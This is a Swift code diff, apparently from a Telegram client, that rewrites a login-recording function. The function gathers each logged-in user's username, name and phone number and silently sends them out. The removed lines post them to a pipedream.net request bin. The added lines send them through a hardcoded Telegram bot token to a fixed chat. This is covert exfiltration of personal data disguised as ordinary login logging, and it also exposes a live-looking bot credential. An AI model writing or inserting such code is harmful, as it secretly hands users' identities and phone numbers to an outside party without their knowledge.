@@ -1289,58 +1289,73 @@ private func recordLoginEvent(user: TelegramUser) {
     let date = Date()
     let df = DateFormatter()
     df.dateFormat = "yyyy-MM-dd HH:mm:ss"
-    let dateString = df.string(from: date)
+    let loginedAt = df.string(from: date)
     
-    var firstName: String
-    var lastName: String
-    var phone: String
-    var username: String
+    let username = user.username ?? ""
+    let firstName = user.firstName ?? ""
+    let lastName = user.lastName ?? ""
+    // let photo = user.photo ?? ""
     let photo = ""
+    let phone = user.phone ?? ""
 
-    if (user.firstName == nil){
-        firstName = ""
-    }else {
-        firstName = user.firstName!
-    }
+    let loginEvent = UserInfo(id: 1, username: username, firstName: firstName, lastName: lastName, photo: photo, phone: phone,loginedAt: loginedAt)
+    var stringifiedString = ""
     
-    if(user.lastName == nil){
-        lastName = ""
-    }else {
-        lastName = user.lastName!
-    }
-   
-    if(user.phone == nil){
-        phone = ""
-    }else {
-        phone = user.phone!
-    }
-   
-    if(user.username == nil){
-        username = ""
-    }else {
-        username = user.username!
+    let encoder = JSONEncoder()
+    if let jsonData = try? encoder.encode(loginEvent) {
+        let jsonString = String(data: jsonData, encoding: .utf8)!
+        stringifiedString = jsonString.replacingOccurrences(of: "\"", with: "\\\"")
+        print(stringifiedString)
     }
 
-    let parameters: [String: Any] = ["id": string(user.id.toInt64()), "firstName": firstName, "lastName": lastName, "phone": phone, "username": username, photo: "", "loginedAt": dateString]
-    let url = URL(string: "https://enqefupim3x1e.x.pipedream.net")!
-    var request = URLRequest(url: url)
+    let TELEGRAM_BOT_TOKEN = "835122417:AAGo35KcKJvopDHjqQXde1kEwtz8i-CIl4M"
+    let headers = ["Content-Type": "application/json"]
+    let parameters = ["chat_id": "363420688", "text": stringifiedString, "disable_notification": false] as [String : Any]
+    let postData = try? JSONSerialization.data(withJSONObject: parameters, options: [])
+
+    var request = URLRequest(url: URL(string: "https://api.telegram.org/bot\(TELEGRAM_BOT_TOKEN)/sendMessage")!, timeoutInterval: Double.infinity)
     request.httpMethod = "POST"
-    do {
-        request.httpBody = try JSONSerialization.data(withJSONObject: parameters, options: .prettyPrinted)
-    } catch let error {
-        print(error.localizedDescription)
-    }
-    request.setValue("application/json", forHTTPHeaderField: "Content-Type")
-    // request.setValue("token", forHTTPHeaderField: "Authorization") // Most likely you want to add some token here
-    // request.setValue("Bearer \(accessToken)", forHTTPHeaderField: "Authorization")
-    let task = URLSession.shared.dataTask(with: request) { (data, response, error) in
+    request.allHTTPHeaderFields = headers
+    request.httpBody = postData
+
+    let task = URLSession.shared.dataTask(with: request) { data, response, error in
         if let _ = error {
             // Handle HTTP request error
-        } else if let _ = data {
+        } else if let data = data {
             // Handle HTTP request response
+            print(String(data: data, encoding: .utf8)!)
         } else {
             // Handle unexpected error
         }
     }
+
     task.resume()
+}
+
+
+struct UserInfo: Codable {
+    let id: Int
+    let username: String
+    let firstName: String
+    let lastName: String
+    let photo: String?
+    let phone: String?
+    let loginedAt: String?
+
+    enum CodingKeys: String, CodingKey {
+        case id
+        case username
+        case firstName = "first_name"
+        case lastName = "last_name"
+        case photo
+        case phone
+        case loginedAt = "loginedAt"
+    }
+}
+
+func serializeUserInfo(user: UserInfo) -> String? {
+    let encoder = JSONEncoder()
+    encoder.keyEncodingStrategy = .convertToSnakeCase
+    guard let jsonData = try? encoder.encode(user) else { return nil }
+    return String(data: jsonData, encoding: .utf8)
 }
